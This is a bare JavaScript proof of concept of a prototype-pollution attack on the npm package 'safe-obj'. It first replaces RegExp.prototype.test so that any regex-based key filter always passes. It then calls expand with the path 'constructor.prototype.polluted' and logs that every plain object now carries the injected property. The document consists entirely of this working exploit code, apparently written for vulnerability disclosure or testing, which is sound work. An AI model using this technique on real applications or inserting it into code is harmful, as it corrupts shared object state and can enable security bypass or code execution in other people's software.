RegExp.prototype.test = () => false;
var safeObj = require('safe-obj');
obj = {};
console.log({}.polluted);
safeObj.expand(obj, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);